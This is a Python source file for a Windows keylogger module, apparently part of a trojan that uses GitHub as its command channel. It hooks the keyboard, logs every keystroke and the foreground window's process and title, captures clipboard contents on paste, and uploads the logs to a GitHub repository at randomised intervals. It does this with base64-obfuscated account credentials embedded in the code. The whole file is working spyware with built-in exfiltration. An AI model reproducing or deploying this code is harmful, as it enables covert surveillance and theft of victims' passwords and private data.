import ctypes
import pythoncom
import pyHook
import win32clipboard
import threading
import time
import random
from github3 import login
import base64
from datetime import datetime

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
current_window = None
string = "Keylogged = "
_id = None


def result(data, module):
    global _id
    gh, repo, branch = connect_git()
    c = datetime.now()
    dt_string = c.strftime("%d-%m-%Y--%H-%M-%S")
    remote_path = "data/%s/%s/%s.data" % (_id, module, str(dt_string))
    repo.create_file(remote_path, "Commit  message", data.encode())
    return remote_path


def connect_git():
    u = "TWlja3lUaA =="
    p = "aG51bWtqMDhkNQ=="
    gh = login(base64.b64decode(u).decode(), base64.b64decode(p).decode())
    repo = gh.repository(base64.b64decode(u).decode(), "55")
    branch = repo.branch("master")
    return gh, repo, branch


def result_update(path, data):
    global string
    string = ""
    u = "TWlja3lUaA =="
    p = "aG51bWtqMDhkNQ=="
    gh = login(base64.b64decode(u).decode(), base64.b64decode(p).decode())
    repo = gh.repository(base64.b64decode(u).decode(), "55")
    data1 = get_content(path)
    data1 = base64.b64decode(data1).decode()
    data1 += data.decode('utf-8', 'ignore')
    repo.file_contents(path).update('commit message', data1.encode())


def get_content(path):
    gh, repo, branch = connect_git()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if path in filename.path:
            print("file found %sdd" % path)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content


def get_current_process():
    global string
    hwnd = user32.GetForegroundWindow()
    pid = ctypes.c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    process_id = "%d" % pid.value
    executable = ctypes.create_string_buffer(512)
    h_process = kernel32.OpenProcess(0X400 | 0X10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
    window_title = ctypes.create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
    string += "PID: %s - %s - %s \n" % (process_id, executable.value, window_title.value)


def KeyStroke(event):
    global string
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if event.Key == "V":
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        string += "######[V OR PASTE] - %s #################\n" % pasted_value
    else:
        string += "[%s] \n" % event.Key
    return True


def main2():
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    pythoncom.PumpMessages()


def run(id):
    global string
    global _id
    _id = id
    th = threading.Thread(target=main2)
    th.start()
    path = result(string, "Pkeylogger")
    time.sleep(random.randint(60, 69))
    while True:
        try:
            print "updating"
            result_update(path, string)
            time.sleep(random.randint(360, 400))
        except:
            continue
